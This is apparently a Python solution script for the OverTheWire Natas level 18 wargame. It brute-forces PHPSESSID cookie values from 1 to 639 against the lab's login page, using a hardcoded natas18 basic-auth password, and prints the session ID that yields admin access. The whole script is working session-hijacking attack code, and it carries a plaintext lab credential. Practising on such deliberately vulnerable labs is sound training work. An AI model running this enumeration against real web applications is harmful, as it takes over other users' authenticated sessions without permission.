import requests
from requests.auth import HTTPBasicAuth

for i in range (1,640):
    cookie = {"PHPSESSID":str(i)}


    r = requests.post(url = 'http://natas18.natas.labs.overthewire.org/index.php?debug', auth = HTTPBasicAuth("natas18", "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq"), data = {"username":'natas19', "password" : 'randi'}, cookies = cookie)

    print(r.text)

    if "You are an admin" in r.text:
        print(i)
